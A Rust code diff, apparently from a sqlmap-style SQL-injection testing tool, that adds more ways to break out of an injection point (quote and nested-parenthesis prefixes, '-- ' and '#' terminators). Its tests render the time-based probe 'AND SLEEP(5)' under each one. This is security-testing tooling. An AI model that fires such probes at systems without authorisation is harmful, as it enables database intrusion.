@@ -143,31 +143,65 @@ impl Boundary {
         out.push_str(&self.suffix);
         out
     }
+
+    /// Construct an arbitrary boundary. The `prefix` carries the literal
+    /// break-out string (quote and/or `)` chars); `paren_depth` appends that
+    /// many extra closing parens after the expression before the terminator.
+    fn mk(prefix: &str, quote_mode: QuoteMode, termination: Termination, paren_depth: u8) -> Self {
+        Self {
+            prefix: prefix.to_string(),
+            suffix: String::new(),
+            quote_mode,
+            termination,
+            paren_depth,
+        }
+    }
 }
 
 /// Candidate boundaries for a context, ordered by prior likelihood.
+///
+/// This is the analog of sqlmap's `boundaries.xml`: the same logical test is
+/// spliced under every plausible break-out (bare, quoted, and nested inside
+/// 1–3 parentheses) and every plausible line terminator (`-- ` and MySQL's
+/// `#`). Breadth here is what lets the composed probes in
+/// [`crate::payload::generate`] adapt to an unknown injection context without
+/// hardcoding a single `' ... -- -` shape.
 pub fn candidates_for(quote_mode: QuoteMode) -> Vec<Boundary> {
+    use QuoteMode::*;
+    use Termination::{HashComment, LineComment};
     match quote_mode {
-        QuoteMode::None => vec![
+        None => vec![
+            // Bare numeric, line- and hash-terminated.
             Boundary::numeric(),
+            Boundary::mk(" ", None, HashComment, 0),
+            // Parenthesised numeric at increasing nesting depth, e.g.
+            // `id IN (1)`, `func((1))`, `a((( 1 )))`.
             Boundary::parenthesised_numeric(),
+            Boundary::mk(")", None, LineComment, 0),
+            Boundary::mk("))", None, LineComment, 0),
+            Boundary::mk(")))", None, LineComment, 0),
         ],
-        QuoteMode::Single => vec![Boundary::single_quoted()],
-        QuoteMode::Double => vec![Boundary::double_quoted()],
-        QuoteMode::Backtick => vec![Boundary {
-            prefix: "`".to_string(),
-            suffix: String::new(),
-            quote_mode: QuoteMode::Backtick,
-            termination: Termination::LineComment,
-            paren_depth: 0,
-        }],
-        QuoteMode::Bracket => vec![Boundary {
-            prefix: "]".to_string(),
-            suffix: String::new(),
-            quote_mode: QuoteMode::Bracket,
-            termination: Termination::LineComment,
-            paren_depth: 0,
-        }],
+        Single => vec![
+            Boundary::single_quoted(),
+            Boundary::mk("'", Single, HashComment, 0),
+            // String value nested inside 1–3 parens, e.g. `WHERE n=('v')`.
+            Boundary::mk("')", Single, LineComment, 0),
+            Boundary::mk("'))", Single, LineComment, 0),
+            Boundary::mk("')))", Single, LineComment, 0),
+        ],
+        Double => vec![
+            Boundary::double_quoted(),
+            Boundary::mk("\")", Double, LineComment, 0),
+            Boundary::mk("\"))", Double, LineComment, 0),
+        ],
+        Backtick => vec![
+            Boundary::mk("`", Backtick, LineComment, 0),
+            Boundary::mk("`)", Backtick, LineComment, 0),
+        ],
+        Bracket => vec![
+            Boundary::mk("]", Bracket, LineComment, 0),
+            Boundary::mk("])", Bracket, LineComment, 0),
+        ],
     }
 }
 
@@ -226,5 +260,45 @@ mod tests {
     fn numeric_candidates_include_paren_variant() {
         let candidates = candidates_for(QuoteMode::None);
         assert!(candidates.iter().any(|b| b.paren_depth == 1));
+    }
+
+    #[test]
+    fn numeric_matrix_covers_nested_paren_breakouts() {
+        let rendered: Vec<String> = candidates_for(QuoteMode::None)
+            .iter()
+            .map(|b| b.render("AND SLEEP(5)"))
+            .collect();
+        // Break out of one, two, and three levels of parentheses.
+        assert!(rendered.iter().any(|r| r.starts_with(')')), "no single-paren break: {rendered:?}");
+        assert!(rendered.iter().any(|r| r.starts_with("))")), "no double-paren break: {rendered:?}");
+        assert!(rendered.iter().any(|r| r.starts_with(")))")), "no triple-paren break: {rendered:?}");
+        // Both a `-- ` and a MySQL `#` terminator are represented.
+        assert!(rendered.iter().any(|r| r.contains("-- ")), "no line comment: {rendered:?}");
+        assert!(rendered.iter().any(|r| r.ends_with('#')), "no hash comment: {rendered:?}");
+    }
+
+    #[test]
+    fn single_quote_matrix_stays_quoted_and_nests() {
+        let candidates = candidates_for(QuoteMode::Single);
+        // Every single-quoted boundary must open with a quote (relied on by
+        // generate::single_quote_context_opens_a_quote).
+        assert!(candidates.iter().all(|b| b.prefix.starts_with('\'')));
+        let rendered: Vec<String> = candidates.iter().map(|b| b.render("AND SLEEP(5)")).collect();
+        assert!(rendered.iter().any(|r| r.starts_with("')")), "no quoted paren break: {rendered:?}");
+        assert!(rendered.iter().any(|r| r.starts_with("')))")), "no quoted triple break: {rendered:?}");
+    }
+
+    #[test]
+    fn every_context_offers_multiple_boundaries() {
+        // The whole point of the matrix: no context is a single fixed shape.
+        for mode in [
+            QuoteMode::None,
+            QuoteMode::Single,
+            QuoteMode::Double,
+            QuoteMode::Backtick,
+            QuoteMode::Bracket,
+        ] {
+            assert!(candidates_for(mode).len() >= 2, "{mode:?} was not diversified");
+        }
     }
 }
